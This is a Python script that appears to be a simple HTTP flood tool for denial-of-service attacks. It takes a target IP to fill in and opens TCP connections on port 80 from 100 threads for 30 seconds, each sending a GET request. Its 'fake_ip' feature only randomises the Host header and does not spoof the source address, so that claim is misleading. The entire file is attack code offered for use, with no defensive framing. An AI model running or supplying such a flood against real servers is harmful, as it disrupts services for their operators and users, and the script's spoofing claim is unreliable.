import threading
import socket
import time
import random

target = '' #input target IP
port = 80
fake_ip = '192.21.12.3'
num_threads = 100
connections_per_thread = 100
stop_event = threading.Event()
already_connected = 0
connection_delay = 0.1  
def attack():
    global already_connected
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendall(('GET / HTTP/1.1\r\nHost: ' + fake_ip + '\r\n\r\n').encode('ascii'))
            s.close()
            time.sleep(connection_delay) 
        except Exception as e:
            print(f"Error: {e}")
        finally:
            already_connected += 1
            if already_connected % connections_per_thread == 0:
                print(f"Connections made: {already_connected}")

def randomize_fake_ip():
    return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"

def attack_with_random_ip():
    global already_connected
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            fake_ip = randomize_fake_ip()
            s.sendall(('GET / HTTP/1.1\r\nHost: ' + fake_ip + '\r\n\r\n').encode('ascii'))
            s.close()
            time.sleep(connection_delay)  
        except Exception as e:
            print(f"Error: {e}")
        finally:
            already_connected += 1
            if already_connected % connections_per_thread == 0:
                print(f"Connections made: {already_connected}")

threads = []
for i in range(num_threads):
    thread = threading.Thread(target=attack_with_random_ip)
    threads.append(thread)
    thread.start()

time.sleep(30)

stop_event.set()

for thread in threads:
    thread.join()

print(f"Total connections made: {already_connected}")